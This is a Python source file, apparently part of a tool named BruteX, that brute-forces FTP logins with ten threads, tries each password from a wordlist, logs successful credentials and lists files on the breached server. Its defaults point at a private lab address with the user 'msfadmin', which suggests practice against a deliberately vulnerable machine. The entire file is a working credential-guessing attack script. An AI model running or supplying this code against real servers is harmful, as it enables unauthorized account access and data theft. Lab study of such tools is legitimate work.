# ftp_brute.py — FTP brute force module for BruteX

import ftplib
import threading
from queue  import Queue
from logger import log, log_success

THREAD_COUNT = 10
TIMEOUT      = 5

found      = False
found_lock = threading.Lock()

def try_ftp(host, port, username, password, results):
    """Try a single FTP login attempt."""
    global found

    if found:
        return

    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=TIMEOUT)
        ftp.login(username, password)

        # Login succeeded!
        with found_lock:
            found = True

        log(f"Trying {username}:{password} → SUCCESS!", "SUCCESS")
        log_success(host, port, "FTP", username, password)
        results.append((username, password))

        # Show what's on the FTP server
        try:
            files = ftp.nlst()
            log(f"FTP files found: {files[:5]}", "INFO")
        except:
            pass

        ftp.quit()

    except ftplib.error_perm:
        log(f"Trying {username}:{password} → FAILED", "FAIL")

    except Exception as e:
        log(f"Connection error: {str(e)}", "ERROR")


def worker(host, port, username, queue, results):
    """Thread worker for FTP brute force."""
    while not queue.empty() and not found:
        password = queue.get()
        try_ftp(host, port, username, password, results)
        queue.task_done()


def ftp_brute(host, port, username, passwords):
    """
    Main FTP brute force function.
    Returns (username, password) if found, None otherwise.
    """
    global found
    found = False

    queue   = Queue()
    results = []
    threads = []

    log(f"Starting FTP brute force on {host}:{port}", "INFO")
    log(f"Target user: {username}", "INFO")
    log(f"Trying {len(passwords)} passwords...\n", "INFO")

    for p in passwords:
        queue.put(p)

    for _ in range(min(THREAD_COUNT, len(passwords))):
        t = threading.Thread(
            target=worker,
            args=(host, port, username, queue, results)
        )
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if results:
        return results[0]
    return None


if __name__ == "__main__":
    import sys
    from wordlist_gen import get_wordlist

    host     = sys.argv[1] if len(sys.argv) > 1 else "192.168.56.200"
    port     = int(sys.argv[2]) if len(sys.argv) > 2 else 21
    username = sys.argv[3] if len(sys.argv) > 3 else "msfadmin"
    wordlist = sys.argv[4] if len(sys.argv) > 4 else None

    passwords = get_wordlist(wordlist, username)
    result    = ftp_brute(host, port, username, passwords)

    if result:
        print(f"\n[+] SUCCESS! {username}:{result[1]}")
    else:
        print(f"\n[-] Password not found for {username}")